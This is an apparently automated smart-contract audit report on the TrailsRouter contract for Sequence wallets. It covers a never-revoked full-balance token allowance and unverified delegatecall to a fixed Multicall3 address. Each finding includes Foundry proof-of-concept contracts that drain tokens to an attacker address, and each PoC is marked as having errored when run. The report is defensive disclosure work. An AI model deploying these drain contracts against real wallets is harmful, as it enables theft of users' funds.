# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern
USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = true; and gpt-5.1
NICHE_PATTERN_ANALYSIS_MODE = false;
Update finding prompt


 **Derived From** : ERC20 target receives full-balance allowance that is never revoked

[M-1]. Balance injection leaves full-wallet ERC20 allowance to arbitrary target, enabling later token drain
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Delegatecall to fixed Multicall3 address without codehash verification

[L-2]. Malicious contract at hard-coded MULTICALL3 address can steal tokens via TrailsRouter.pullAmountAndExecute delegatecall
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[M-3]. execute delegates to hard-coded Multicall3 address without verifying its implementation
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 0
- M: 2
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : ERC20 target receives full-balance allowance that is never revoked

## [M-1]. Balance injection leaves full-wallet ERC20 allowance to arbitrary target, enabling later token drain

### Finding Severity Justification: The router’s balance-injection helpers approve an arbitrary target for up to the caller’s full ERC20 balance and never revoke that allowance, and this approval is done from the wallet context when used via delegatecall. A malicious or later‑compromised target can subsequently transferFrom the user’s wallet without further user interaction, potentially draining all current and future holdings of that token. This creates a real, protocol‑level loss of user funds that persists beyond the intended single operation. While the approval is scoped to the specific target chosen by the intent route (not globally), it is effectively unlimited in time and amount relative to the wallet’s balance, so it fits Code4rena’s “assets can be stolen indirectly via protocol design” criteria. However, it requires that the chosen target be or become malicious (or misconfigured), so likelihood is lower than a pure direct theft bug; this justifies Medium rather than High.
## Derived From Pattern/Invariant
ERC20 target receives full-balance allowance that is never revoked

## Exploit Type
AccessControl

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `TrailsRouter._injectAndExecuteCall`, the router approves an arbitrary `target` to spend the *entire* ERC20 balance of the current context (router or delegating wallet) and never revokes this allowance.

Relevant code:

```solidity
function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // ... optional placeholder replacement ...

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    }
}
```

`callerBalance` is computed as the full token balance in the current context:
- In `injectSweepAndCall`, it is the entire `msg.sender` balance that was just transferred into the router.
- In `injectAndCall`, it is `_getSelfBalance(token)`, i.e. the full balance of the router *or* (under `delegatecall`) the full balance of the calling wallet.
- In the delegated Sequence-wallet flow, `handleSequenceDelegateCall` calls `_injectAndCallDelegated`, which also uses `_getSelfBalance(token)` and then funnels into `_injectAndExecuteCall`.

There is **no allowance reset** (`approve(0)` or equivalent) after `target.call`. As a result, the arbitrary `target` retains a standing allowance for up to `callerBalance` tokens from the router or the delegating wallet.

In the intended Sequence v3 wallet context, `TrailsRouter` is always invoked via `delegatecall`, so these approvals are from the **user's wallet** to the arbitrary `target` specified in the intent. If `target` is malicious, compromised, or later upgraded, it can call `transferFrom(wallet, target, amount)` repeatedly, draining tokens well after the original Trails operation has completed. This violates the intended invariant that balance injection is scoped to a single operation and does not leave dangerous residue state.

## Impact
Any contract used as `target` in a balance-injection flow (e.g. via `injectAndCall` / `_injectAndCallDelegated`) receives an allowance equal to the wallet's entire balance of `token` and keeps it indefinitely. A malicious or later-compromised `target` can, at any time after the initial call, invoke `transferFrom` to pull up to that amount from the wallet. This can fully drain the user’s holdings of that token, including funds deposited long after the original Trails intent was executed.

## Command to Run Test


## Proof of Concept
1. User’s Sequence v3 wallet (or any contract) holds 100 tokens of `TOKEN`.
2. An intent or direct call causes the wallet to delegatecall into `TrailsRouter` and execute a balance-injection call:
   - The wallet (via router) calls `_injectAndExecuteCall(TOKEN, target, callData, ..., callerBalance)` where `callerBalance = 100`.
   - Inside `_injectAndExecuteCall`, the router executes `forceApprove(TOKEN, target, 100)` *from the wallet context* and then calls `target.call(callData)`.
3. The `target` contract is written to behave honestly in `callData` (e.g., a swap function), so the user’s route appears to execute correctly. The target either uses none or only part of the allowance.
4. Crucially, after the call returns, the allowance `allowance[wallet][target]` remains 100 (or higher than the amount actually spent).
5. Days later, the `target` contract is upgraded/compromised or its owner calls a new `drain()` function:
   - The `target` executes `IERC20(TOKEN).transferFrom(wallet, attacker, amount)` using the still-present allowance.
   - Because the allowance was never zeroed, the transfer succeeds, draining up to the full approved amount from the wallet, including any new `TOKEN` the user has acquired since the original Trails operation.

This attack does not require any further interaction from the user after the initial signed intent; a single Trails balance-injection call permanently approves the `target` for the full wallet balance until explicitly revoked (which the router never does).

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/TrailsRouter.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousTarget {
    function initialCall() external {
        // simulate a normal downstream call that does nothing
    }

    function drain(address token, address victim, address to) external {
        uint256 bal = IERC20(token).balanceOf(victim);
        IERC20(token).transferFrom(victim, to, bal);
    }
}

// Simple wallet that uses TrailsRouter via delegatecall, mimicking Sequence v3
contract Wallet {
    TrailsRouter public router;

    constructor(TrailsRouter _router) {
        router = _router;
    }

    // Delegatecall into router.injectAndCall, which uses this contract's balance
    function runInject(address token, address target) external {
        bytes memory callData = abi.encodeWithSelector(MaliciousTarget.initialCall.selector);
        (bool ok,) = address(router).delegatecall(
            abi.encodeWithSelector(
                TrailsRouter.injectAndCall.selector,
                token,
                target,
                callData,
                uint256(0),
                bytes32(0)
            )
        );
        require(ok, "injectAndCall failed");
    }
}

contract AllowanceDrainTest is Test {
    TrailsRouter router;
    MockERC20 token;
    Wallet wallet;
    MaliciousTarget target;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();
        target = new MaliciousTarget();
        wallet = new Wallet(router);

        // Fund wallet with 100 tokens
        token.mint(address(wallet), 100 ether);
    }

    function testAllowanceDrainAfterInjectAndCall() public {
        // Wallet delegatecalls into router.injectAndCall, which approves full
        // wallet token balance to the malicious target
        wallet.runInject(address(token), address(target));

        // Full-balance allowance has been given from wallet to target
        assertEq(token.allowance(address(wallet), address(target)), 100 ether);

        // Later, the target drains the wallet using the leftover allowance
        vm.prank(attacker);
        target.drain(address(token), address(wallet), attacker);

        assertEq(token.balanceOf(attacker), 100 ether);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}


## Suggested Mitigation
Limit and revoke the ERC20 allowance around the external call. Instead of leaving a standing `callerBalance` approval, wrap the call with an allowance reset:

```solidity
IERC20 erc20 = IERC20(token);
// Option 1: approve only the exact amount needed
SafeERC20.forceApprove(erc20, target, callerBalance);
(bool success, bytes memory result) = target.call(callData);
// Always clear allowance, even on success
SafeERC20.forceApprove(erc20, target, 0);
```

If some downstream protocols require a non-zero residual allowance, track per-call approvals and only approve the minimum required amount, never the whole wallet balance. For delegated wallet usage, consider performing the transfer in the router (pull pattern) instead of granting third-party spending rights via `approve`.





 **Derived From** : Delegatecall to fixed Multicall3 address without codehash verification

## [L-2]. Malicious contract at hard-coded MULTICALL3 address can steal tokens via TrailsRouter.pullAmountAndExecute delegatecall

### Finding Severity Justification: The reported issue is a trust assumption around the hard‑coded Multicall3 singleton address being benign on each deployed chain. If that address is instead controlled by an attacker, then delegatecalling into it from execute/pullAmountAndExecute could indeed allow arbitrary logic to run in the router’s (or wallet’s) context and steal tokens. However, this assumes a misconfigured or hostile chain environment where the well‑known 0xcA11…CA11 singleton is not the canonical Multicall3 instance but a malicious contract. On mainline EVM networks where this address is standardized and widely relied upon, the threat reduces to a general “don’t trust a hostile L1/L2” assumption. Under Code4rena guidelines, such environment/chain‑level trust assumptions and singleton deployment hygiene are considered architectural or configuration risks rather than exploitable protocol bugs, so the impact for this contest is capped at Low.
## Derived From Pattern/Invariant
Delegatecall to fixed Multicall3 address without codehash verification

## Exploit Type
UntrustedDelegateCall

## Location
TrailsRouter.pullAmountAndExecute

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`TrailsRouter` delegates execution to a hard-coded Multicall3 address `0xcA11bde05977b3631167028862bE2a173976CA11` without verifying that the contract at that address is the expected, benign Multicall3 implementation.

Relevant code:
```solidity
address public immutable MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;

function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
    _validateRouterCall(data);
    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}

function pullAmountAndExecute(address token, uint256 amount, bytes calldata data)
    public
    payable
    returns (IMulticall3.Result[] memory returnResults)
{
    _validateRouterCall(data);
    if (token == address(0)) {
        if (msg.value < amount) revert InsufficientEth(amount, msg.value);
    } else {
        _safeTransferFrom(token, msg.sender, address(this), amount);
    }

    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}
```

`_validateRouterCall` ensures only the `aggregate3Value` selector is used and that `allowFailure == false`, but it does **not** check the bytecode or codehash of `MULTICALL3`. If, on a given chain, the address `0xcA11…CA11` does not contain the canonical Multicall3 implementation (for example, on a new chain where this address is uninitialized and a malicious contract is deployed there), then `TrailsRouter` will happily `delegatecall` into arbitrary attacker-controlled code.

This is particularly dangerous for `pullAmountAndExecute`:
1. The router first pulls `amount` tokens from `msg.sender` into itself using `_safeTransferFrom`.
2. It then `delegatecall`s the untrusted contract at `MULTICALL3` with user-controlled `data` that passes `_validateRouterCall`.
3. Inside the malicious contract’s `aggregate3Value` implementation, running in the router’s context due to `delegatecall`, the attacker’s code can freely call `IERC20(token).transfer(attacker, balanceOf(address(this)))` or perform other arbitrary state changes.

Because the call is a `delegatecall`, the malicious code executes with full control over the router’s storage and permissions. In the direct-call mode, this allows theft of the tokens that were just pulled into the router. In delegatecall context from a Sequence wallet (via the shim), malicious Multicall3 code would execute in the **wallet’s** storage context, potentially allowing it to drain wallet-held tokens or modify wallet configuration.

The router assumes the environment always deploys the canonical Multicall3 at `0xcA11…CA11` and never enforces this assumption on-chain.

## Impact
On any chain where `0xcA11bde0…CA11` does not hold the canonical, benign Multicall3 code, an attacker controlling the contract at that address can:
- For direct users of `pullAmountAndExecute`: steal all tokens pulled into the router in a single call by transferring them out inside the malicious `aggregate3Value` during `delegatecall`.
- For Sequence wallets (or other wallet-like contracts) using the router via `delegatecall`: execute arbitrary logic in the wallet’s storage context and potentially drain all ERC20 balances or corrupt wallet configuration.

The impact is full theft of user funds passing through `pullAmountAndExecute` and possible compromise of wallet-state for delegatecall use. The issue is environment-dependent (it requires a malicious or misconfigured contract at the fixed MULTICALL3 address), but the blast radius is very large when it occurs.

## Command to Run Test


## Proof of Concept
This PoC shows how a malicious contract deployed at the hard-coded MULTICALL3 address can steal tokens from a user calling `pullAmountAndExecute`.

1. Deploy `TrailsRouter` as in production.
2. Deploy a standard ERC20 token `MockERC20` and mint 100 tokens to `user`.
3. Deploy a `MaliciousMulticall` contract that implements a function with the same signature as `aggregate3Value(Call3Value[] calldata)` and, when called via `delegatecall`, transfers all ERC20 tokens held by `address(this)` to a hard-coded attacker address.
4. Using a cheatcode (e.g., `vm.etch` in Foundry), overwrite the code at `router.MULTICALL3()` (0xcA11…CA11) with `MaliciousMulticall`’s runtime code, simulating a chain where that address is malicious.
5. From `user`:
   - Approve the router to spend `amount` tokens.
   - Build `IMulticall3.Call3Value[] calls` of length 1, with `calls[0].target = address(token)`, `allowFailure = false`, `value = 0`, and empty `callData`.
   - Encode `data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls)`.
   - Call `router.pullAmountAndExecute(address(token), amount, data)`.
6. `_validateRouterCall` passes because the selector and `allowFailure` are correct.
7. The router pulls `amount` tokens from `user` into itself.
8. The router `delegatecall`s into the malicious contract at `MULTICALL3`.
9. Inside `MaliciousMulticall.aggregate3Value`, running in the router’s context, it executes `IERC20(token).transfer(attacker, balanceOf(address(this)))`, stealing all tokens the router just pulled.
10. The malicious function returns a correctly-encoded `Result[]` so the router does not revert.
11. After the transaction:
    - `user`’s balance decreased by `amount`.
    - `attacker`’s balance increased by `amount`.
    - No revert occurred, so the theft is silent.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is IERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public constant decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "insufficient allowance");
        allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }
}

contract MaliciousMulticall {
    address public immutable attacker;

    struct Call3Value {
        address target;
        bool allowFailure;
        uint256 value;
        bytes callData;
    }

    struct Result {
        bool success;
        bytes returnData;
    }

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // Called via delegatecall from TrailsRouter
    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory results) {
        // Interpret calls[0].target as the ERC20 token address
        IERC20 token = IERC20(calls[0].target);
        uint256 bal = token.balanceOf(address(this));
        if (bal > 0) {
            token.transfer(attacker, bal);
        }
        // Return a single successful Result to satisfy TrailsRouter's decode
        results = new Result[](1);
        results[0] = Result({success: true, returnData: ""});
    }
}

contract UntrustedMulticallTest is Test {
    TrailsRouter internal router;
    MockERC20 internal token;
    address internal user = address(0x1234);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();
        token.mint(user, 100 ether);

        // Deploy malicious multicall and overwrite code at the router's MULTICALL3 address
        MaliciousMulticall mm = new MaliciousMulticall(attacker);
        address multicallAddr = router.MULTICALL3();
        vm.etch(multicallAddr, address(mm).code);
        assertGt(multicallAddr.code.length, 0);
    }

    function test_maliciousMulticallStealsPulledTokens() public {
        uint256 amount = 10 ether;

        vm.startPrank(user);
        token.approve(address(router), amount);

        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: ""
        });

        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        router.pullAmountAndExecute(address(token), amount, data);
        vm.stopPrank();

        // User's tokens were pulled, and malicious multicall stole them to the attacker
        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(attacker), amount);
    }
}


## Suggested Mitigation
Do not blindly `delegatecall` to an external address assumed to be Multicall3. Instead:

1. **Pin the implementation by codehash**: In the constructor, verify that `MULTICALL3` has the expected bytecode:
```solidity
bytes32 constant EXPECTED_MULTICALL3_CODEHASH = 0x...; // precomputed offline

constructor() {
    if (MULTICALL3.code.length == 0 || MULTICALL3.codehash != EXPECTED_MULTICALL3_CODEHASH) {
        revert InvalidMulticallImplementation();
    }
}
```
This prevents deployment or use on chains where `0xcA11…CA11` does not contain the canonical Multicall3 implementation.

2. Alternatively, **deploy and use an internal Multicall3 implementation** (or inline its logic) instead of relying on a chain-specific singleton address. This removes the external dependency entirely and ensures that the code being delegatecalled is part of the same audited codebase.

3. If preserving `msg.sender` via `delegatecall` is not strictly required, consider switching to a regular `call` to Multicall3. A normal call limits the blast radius of any Multicall3 misbehavior to the router contract, instead of the caller’s storage context when used via delegatecall.


## [M-3]. execute delegates to hard-coded Multicall3 address without verifying its implementation

### Finding Severity Justification: The router uses `delegatecall` to a hard‑coded external address (`MULTICALL3 = 0xcA11...`) inside `execute` and `pullAmountAndExecute`. When TrailsRouter is itself invoked via `delegatecall` from a Sequence wallet, this yields a nested delegatecall chain Wallet → TrailsRouter → MULTICALL3. If on a given network that singleton address does not host the canonical Multicall3 but instead malicious or unexpected code, the malicious implementation executes in the wallet’s storage context and can arbitrarily move funds or corrupt configuration. This is a full compromise of wallets on misconfigured or hostile chains, but it relies on an environmental assumption being broken (deployment on a chain where 0xcA11… is not the audited singleton). Under Code4rena’s rubric, that is high impact but lower likelihood / configuration‑dependent, fitting a Medium severity.
## Derived From Pattern/Invariant
Delegatecall to fixed Multicall3 address without codehash verification

## Exploit Type
UntrustedDelegateCall

## Location
TrailsRouter.execute

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter delegates execution to a fixed Multicall3 address `0xcA11bde05977b3631167028862bE2a173976CA11` and assumes that this address always contains the canonical, safe Multicall3 implementation. There is no on-chain verification (codehash, bytecode, or minimal interface checks) to enforce this assumption.

Relevant code:

```solidity
address public immutable MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;

function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
    _validateRouterCall(data);
    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}

function pullAmountAndExecute(address token, uint256 amount, bytes calldata data)
    public
    payable
    returns (IMulticall3.Result[] memory returnResults)
{
    _validateRouterCall(data);
    if (token == address(0)) {
        if (msg.value < amount) revert InsufficientEth(amount, msg.value);
    } else {
        _safeTransferFrom(token, msg.sender, address(this), amount);
    }

    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}
```

`_validateRouterCall` only ensures:
- The selector is `aggregate3Value` (0x174dea71), and
- All `Call3Value.allowFailure` flags are `false`.

It does **not** validate the code at `MULTICALL3`. On chains or forks where:
- `0xcA11...` has not been pre-deployed with canonical Multicall3, or
- An attacker/front-runner has deployed a malicious contract at that address,

any call to `execute` / `pullAmountAndExecute` will `delegatecall` into attacker-controlled code.

When TrailsRouter is itself invoked via `delegatecall` from a Sequence wallet, the call chain becomes:

`Wallet (storage context) -> delegatecall -> TrailsRouter -> delegatecall -> MULTICALL3`

Because both calls are `delegatecall`, the malicious code at `MULTICALL3` executes **in the wallet’s storage and balance context** (i.e., `address(this)` is the wallet), giving it arbitrary power to:
- Transfer out ERC20 tokens and native ETH from the wallet,
- Modify wallet storage (owners, modules, configuration), or
- Perform further arbitrary external calls as if it were the wallet.

All of this can occur while `_validateRouterCall` passes, since it only checks the calldata shape, not the implementation behind `MULTICALL3`.

## Impact
Because TrailsRouter uses `delegatecall` to a hard-coded `MULTICALL3` address, any discrepancy between the expected canonical Multicall3 implementation and the actual code at that address creates an untrusted-delegatecall scenario. When TrailsRouter is used as designed via `delegatecall` from a Sequence wallet (or intent account), the call chain becomes `Wallet → delegatecall(Router) → delegatecall(MULTICALL3)`. If on a given network the address `0xcA11bde05977b3631167028862bE2a173976CA11` has been deployed with malicious or unexpected logic, that logic executes in the wallet’s storage context and can arbitrarily transfer ERC20/native balances, modify configuration, or perform further external calls as if it were the wallet. Even when TrailsRouter is called directly (not via delegatecall), a malicious Multicall3 implementation can still steal funds that have been pulled into the router (`pullAndExecute` / `pullAmountAndExecute`) and corrupt any router-owned state (or future state if the implementation is ever changed). This results in complete compromise of wallets and intents using TrailsRouter on chains where the hard-coded Multicall3 singleton is incorrect or hostile, making the impact high but conditional on deployment environment/configuration.

## Command to Run Test


## Proof of Concept
This revised PoC keeps the same attack scenario (malicious Multicall3 at the hard-coded address) but uses calldata that actually passes `_validateRouterCall`, which decodes an `IMulticall3.Call3Value[]` and enforces `allowFailure == false`.

High-level steps:

1. Deploy `TrailsRouter` and a simple ERC20 `MockToken`.
2. Deploy a `MulticallWallet` contract that holds some `MockToken` balance and exposes `executeViaRouter`, which delegatecalls into `TrailsRouter.execute`.
3. Deploy a `MaliciousMulticall` contract that:
   - Implements `aggregate3Value(Call3Value[] calldata calls)`.
   - In that function, decodes `(address token, address to, uint256 amount)` from `calls[0].callData` and executes `IERC20(token).transfer(to, amount)`.
   - Returns a well-formed array of `Result` structs so decoding in `TrailsRouter.execute` succeeds.
4. Use `vm.etch` in Foundry to copy the runtime bytecode of `MaliciousMulticall` to the hard-coded `MULTICALL3` address, i.e. `0xcA11bde05977b3631167028862bE2a173976CA11`. This simulates a chain where this singleton is malicious.
5. Construct valid `aggregate3Value` calldata:
   - Build an array of length 1: `IMulticall3.Call3Value[] calls = new IMulticall3.Call3Value[](1);`
   - Set `calls[0] = IMulticall3.Call3Value({ target: address(0), allowFailure: false, value: 0, callData: abi.encode(address(token), attacker, 50 ether) });`.
   - Encode `data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);`.
   This matches what `_validateRouterCall` expects: selector `0x174dea71` followed by an ABI-encoded `Call3Value[]` where all `allowFailure` flags are `false`.
6. From the attacker EOA, call `wallet.executeViaRouter(router, data)`.
   - The wallet delegatecalls into `TrailsRouter.execute`.
   - `_validateRouterCall(data)` succeeds because the selector is correct and `allowFailure == false`.
   - `TrailsRouter` then performs `MULTICALL3.delegatecall(data)`. Because `MULTICALL3` has been overwritten with the malicious bytecode, this is effectively a nested delegatecall chain: `Wallet (storage context) → TrailsRouter → MaliciousMulticall`.
7. Inside `MaliciousMulticall.aggregate3Value`, `address(this)` is the wallet (because of the nested delegatecalls). It executes `IERC20(token).transfer(attacker, 50 ether)` from the wallet’s balance.
8. After the call finishes, the attacker's balance increased by 50 tokens and the wallet's balance decreased by 50 tokens, proving that a malicious implementation at `MULTICALL3` can arbitrarily drain funds from wallets using TrailsRouter on such a chain.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/TrailsRouter.sol";
import "../src/interfaces/IMulticall3.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("MockToken", "MOCK") {
        _mint(msg.sender, 1e24);
    }
}

// Malicious replacement for Multicall3 at 0xcA11...
contract MaliciousMulticall is IMulticall3 {
    function aggregate3(Call3[] calldata) external payable override returns (Result[] memory returnData) {
        // Not used in this PoC
        returnData = new Result[](0);
    }

    function aggregate3Value(Call3Value[] calldata calls)
        external
        payable
        override
        returns (Result[] memory returnData)
    {
        // Interpret the first call's calldata as (token, to, amount)
        (address token, address to, uint256 amount) = abi.decode(calls[0].callData, (address, address, uint256));

        // Because of nested delegatecalls (Wallet -> TrailsRouter -> MULTICALL3),
        // address(this) is actually the Wallet, so this sends tokens from the wallet.
        IERC20(token).transfer(to, amount);

        // Return a success Result for each call so TrailsRouter's decode does not revert
        uint256 len = calls.length;
        returnData = new Result[](len);
        for (uint256 i = 0; i < len; i++) {
            returnData[i] = Result({success: true, returnData: ""});
        }
    }
}

// Simulates a Sequence wallet delegating into TrailsRouter
contract MulticallWallet {
    function executeViaRouter(TrailsRouter router, bytes memory data) external {
        (bool ok,) = address(router).delegatecall(
            abi.encodeWithSelector(TrailsRouter.execute.selector, data)
        );
        require(ok, "delegatecall failed");
    }
}

contract TrailsRouterUntrustedMulticallTest is Test {
    TrailsRouter router;
    MockToken token;
    MulticallWallet wallet;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockToken();
        wallet = new MulticallWallet();

        // Fund the wallet with tokens
        token.transfer(address(wallet), 100 ether);

        // Deploy malicious multicall and overwrite code at the MULTICALL3 address
        MaliciousMulticall mm = new MaliciousMulticall();
        vm.etch(router.MULTICALL3(), address(mm).code);
    }

    function testMaliciousMulticallDrainsWallet() public {
        // Build aggregate3Value calldata that instructs malicious multicall to steal 50 tokens
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(0),
            allowFailure: false,
            value: 0,
            callData: abi.encode(address(token), attacker, 50 ether)
        });

        bytes memory data = abi.encodeWithSelector(
            IMulticall3.aggregate3Value.selector,
            calls
        );

        uint256 attackerBefore = token.balanceOf(attacker);
        uint256 walletBefore = token.balanceOf(address(wallet));

        // Attacker triggers the wallet to execute via the router
        vm.prank(attacker);
        wallet.executeViaRouter(router, data);

        assertEq(token.balanceOf(attacker), attackerBefore + 50 ether, "attacker should gain 50 tokens");
        assertEq(token.balanceOf(address(wallet)), walletBefore - 50 ether, "wallet should lose 50 tokens");
    }
}


## Suggested Mitigation
To fully eliminate the untrusted-delegatecall risk, the router must not blindly `delegatecall` into a hard-coded external address whose implementation can vary across networks.

Concrete options:

1. **Use an internal, pinned Multicall3 implementation**:
   - Deploy a dedicated Multicall3 contract as part of the Trails deployment (e.g., via the same ERC-2470 singleton factory or via CREATE2), and store its address immutably in the router.
   - Because this deployment is under the project’s control, you can guarantee the bytecode and avoid depending on a public singleton that might not exist or may be re-used on some chains.

2. **Add strict on-chain code verification and/or configurability**:
   - On construction (or via an explicit initializer), check that:
     - `MULTICALL3.code.length > 0`, and
     - `keccak256(MULTICALL3.code)` equals a precomputed constant `CANONICAL_MULTICALL3_CODEHASH` corresponding to the audited implementation.
   - If either check fails, revert and effectively disable deployment on that chain.
   - Alternatively, make the Multicall3 address a constructor parameter or governance-controlled storage variable (not an unchangeable constant), with a one-time `setMulticall3(address)` that:
     - Can only be called by a trusted owner/governance during deployment bootstrap, and
     - Enforces the same `code.length` and `codehash` checks before updating.

3. **Avoid nested delegatecall when not strictly needed**:
   - If preserving `msg.sender` across calls is not required for all use-cases, consider using `call` instead of `delegatecall`, or limiting `delegatecall` usage to contexts where the router is not itself being executed via `delegatecall`.
   - For contexts where nested delegatecall is unavoidable (Sequence wallet delegatecalls into router), prefer approach (1) so that the delegated implementation is always under your control.

Any of these approaches, combined with strict verification of the Multicall3 bytecode, prevents arbitrary or malicious code at `0xcA11…` from being executed in the caller’s storage context and removes the environment-dependent compromise vector.



